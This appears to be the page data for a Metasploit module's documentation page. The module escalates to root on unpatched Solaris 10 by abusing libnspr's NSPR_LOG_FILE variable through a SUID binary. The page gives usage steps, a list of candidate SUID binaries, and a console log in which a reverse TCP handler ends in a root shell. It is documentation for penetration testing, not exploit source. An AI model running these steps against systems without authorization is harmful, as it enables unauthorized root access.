{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/solaris/local/libnspr_nspr_log_file_priv_esc","result":{"data":{"moduleMetadataJson":{"id":"a95b2b37-da03-5bae-8bc1-6ac1e960aa00","name":"Solaris libnspr NSPR_LOG_FILE Privilege Escalation","fullname":"exploit/solaris/local/libnspr_nspr_log_file_priv_esc","description":"This module exploits an arbitrary file write vulnerability in the\n        Netscape Portable Runtime library (libnspr) on unpatched Solaris systems\n        prior to Solaris 10u3 which allows users to gain root privileges.\n\n        libnspr versions prior to 4.6.3 allow users to specify a log file with\n        the `NSPR_LOG_FILE` environment variable. The log file is created with\n        the privileges of the running process, resulting in privilege escalation\n        when used in combination with a SUID executable.\n\n        This module writes a shared object to the trusted library directory\n        `/usr/lib/secure` and runs the specified SUID binary with the shared\n        object loaded using the `LD_LIBRARY_PATH` environment variable.\n\n        This module has been tested successfully with libnspr version 4.5.1\n        on Solaris 10u1 (01/06) (x86) and Solaris 10u2 (06/06) (x86).","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/solaris/local/libnspr_nspr_log_file_priv_esc","documentationSlug":"/modules/documentation/exploit/solaris/local/libnspr_nspr_log_file_priv_esc"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module exploits an arbitrary file write vulnerability in the\nNetscape Portable Runtime library (libnspr) on unpatched Solaris systems\nprior to Solaris 10u3 which allows users to gain root privileges.</p>\n<p>  libnspr versions prior to 4.6.3 allow users to specify a log file with\nthe <code class=\"language-text\">NSPR_LOG_FILE</code> environment variable. The log file is created with\nthe privileges of the running process, resulting in privilege escalation\nwhen used in combination with a SUID executable.</p>\n<p>  This module writes a shared object to the trusted library directory\n<code class=\"language-text\">/usr/lib/secure</code> and runs the specified SUID binary with the shared\nobject loaded using the <code class=\"language-text\">LD_LIBRARY_PATH</code> environment variable.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This module has been tested successfully with <a href=\"https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSPR\">libnspr</a>\nversion 4.5.1 on Solaris 10u1 (01/06) (x86) and Solaris 10u2 (06/06) (x86).</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Get a session</li>\n<li>Do: <code class=\"language-text\">use exploit/solaris/local/libnspr_nspr_log_file_priv_esc</code></li>\n<li>Do: <code class=\"language-text\">set SESSION [SESSION]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a new <em>root</em> session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>SESSION</strong></p>\n<p>  Which session to use, which can be viewed with <code class=\"language-text\">sessions</code></p>\n<p>  <strong>SUID_PATH</strong></p>\n<p>  Path to suid executable (must be linked to a vulnerable version of <code class=\"language-text\">libnspr4.so</code>)\n(default: <code class=\"language-text\">/usr/bin/cancel</code>)</p>\n<p>  Some useful example SUID executables:</p>\n<ul>\n<li>/usr/bin/cancel</li>\n<li>/usr/bin/chkey</li>\n<li>/usr/bin/lp</li>\n<li>/usr/bin/lpset</li>\n<li>/usr/bin/lpstat</li>\n<li>/usr/lib/lp/bin/netpr</li>\n<li>/usr/sbin/lpmove</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/solaris/local/libnspr_nspr_log_file_priv_esc \nmsf5 exploit(solaris/local/libnspr_nspr_log_file_priv_esc) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(solaris/local/libnspr_nspr_log_file_priv_esc) &gt; set lhost 172.16.191.196\nlhost =&gt; 172.16.191.196\nmsf5 exploit(solaris/local/libnspr_nspr_log_file_priv_esc) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.196:4444 \n[+] Created file /usr/lib/secure/libldap.so.5\n[*] Writing &#39;/tmp/.8ENHI80b/.z6luu3Y1JC.c&#39; (166 bytes) ...\n[*] Writing &#39;/tmp/.8ENHI80b/.1hC6r9F&#39; (175 bytes) ...\n[*] Executing payload...\n[+] Deleted /usr/lib/secure/libldap.so.5\n[+] Deleted /tmp/.8ENHI80b/.z6luu3Y1JC.c\n[+] Deleted /tmp/.8ENHI80b/.z6luu3Y1JC\n[!] Tried to delete /usr/lib/secure/libldap.so.5, unknown result\n[+] Deleted /tmp/.8ENHI80b/.1hC6r9F\n[+] Deleted /tmp/.8ENHI80b\n\nid\nuid=0(root) gid=0(root)\nuname -a\nSunOS unknown 5.10 Generic_118844-26 i86pc i386 i86pc</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"a95b2b37-da03-5bae-8bc1-6ac1e960aa00"}}}